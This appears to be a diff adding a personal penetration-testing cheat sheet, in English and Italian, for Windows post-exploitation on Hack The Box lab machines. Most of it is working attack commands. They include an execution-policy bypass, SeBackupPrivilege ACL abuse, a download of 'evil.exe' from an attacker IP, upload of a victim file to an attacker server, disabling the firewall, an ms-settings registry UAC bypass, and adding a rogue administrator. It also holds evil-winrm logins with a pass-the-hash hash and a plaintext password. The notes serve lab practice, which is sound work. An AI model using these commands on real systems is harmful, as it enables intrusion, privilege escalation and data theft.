@@ -1,0 +1,115 @@
+POWERSHELL COMMANDS:
+    -ExecutionPolicy Bypass         //bypass all execution policy for a user executing the single command where the flag is used
+
+    Get-ExecutionPolicy -Scope CurrentUser
+    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrrentUser
+    Get-Acl
+    Get-ChildItem
+    Import-CliXml -Path cred.xml
+    Get-ChildItem -Path C:\Users\ -Filter proof.txt -Recurse -ErrorAction SilentlyContinue -Force     //recursive file search
+    
+
+
+FILES IMPORTANTI (AD E ALTRO):
+  Groups.xml
+  ntds.dit                      //diskshadow, SeBackupPrivilege,
+
+NOTABLE PRIVILEGES SET:
+  whoami /priv
+
+  //SeBackupPrivilege
+        $path='C:\Users\Administrator\Desktop\root.txt'
+        $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BLACKFIELD.LOCAL\svc_backup","FullControl","Allow")
+        $acl = get-acl $path
+        $acl.AddAccessRule($AccessRule)
+        set-acl -Path $path -AclObject $acl
+
+        Copy-FileSeBackupPrivilege
+
+
+
+  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
+
+
+FILE TRANSFER (WINDOWS):
+	//using simple script wget.ps1
+	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+	//one-liner
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+
+	//using hex, first on kali:
+	upx -9 nc.exe
+	exe2hex -x nc.exe -p nc.cmd				//in windows execute nc.cmd or execute the commands in it to rebuild the exe nc.exe
+
+	//upload a file to upload.php:
+	powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
+
+  //using samba
+  python3 scripts/smbserver.py share .      //on attacker machine
+  copy \\10.10.14.47\share\evil.exe .         //on target machine
+  copy  file.txt  \\10.10.14.47\share\        //on target machine to copy a file to attacker
+
+  //evilwinrm
+  se sono in una sessione creata con winrm posso usare il comando upload direttamente nel terminale che tengo aperto sulla macchina
+  upload /home/daerves/Scrivania/git/SecNotes/htb/active_directory_101/2_sauna/winPEASx64.exe
+  Info: Uploading /home/daerves/Scrivania/git/SecNotes/htb/active_directory_101/2_sauna/winPEASx64.exe to C:\Users\FSmith\Documents\winPEASx64.exe
+  lo stesso si può fare con download
+  download file-target path-macchina-dove-salvare
+
+  ./evil-winrm.rb -i 10.10.10.192 -u svc_backup --hash 9658d1d1dcd9250115e2205d9f48400d
+
+
+COMANDI:
+    //disablke firewall:
+    netsh advfirewall set allprofiles state off
+    cls
+    cd
+    pwd
+    dir                 //ls
+    dir -force          //show hidden files/folders
+    whoami
+    net user            //vedi tutti gli utenti
+    net user <username> //info su un utente
+    hostname
+    findstr         //grep
+    tasklist           //ps
+    ipconfig
+    route
+    netstat
+    netsh
+    schtasks
+    wmic
+    net user admin <new_pwd>
+    powershell.exe Start-Process cmd.exe -Verb runAs        //start shell with high integrity level (as administrator)
+    REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+    REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ       // /v -> value, /t -> type
+    REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f        // /d  --> new registry value, /f add value silently
+    icacls
+
+    //create user named "evil" and add to administrators
+    net user evil Evil!pass /add
+    net localgroup administrators evil /add
+
+
+    move <orig_file> <dest_file>
+    net stop Serviio        //stop running service
+    wmic service
+    shutdown /r /t 0
+    type <filename>
+    more <filename>
+    wmic logicaldisk get deviceid, volumename, description                  //controlla drive montati
+
+    whoami /user            //ottieni user e SID
+
+    Get-Process -IncludeUserName | Select-Object -Unique -Property UserName
+    cmdkey /list
+
+EXPLOIT:
+    SMB:
+        https://book.hacktricks.xyz/pentesting/pentesting-smb#list-shared-folders
+
+EXPLOIT WINRM:
+    net user robisl
+    https://github.com/Hackplayers/evil-winrm
+    evil-winrm -i 10.10.10.203 -u robisl -p wolves11                //si può mettere un file per users e un file pwd
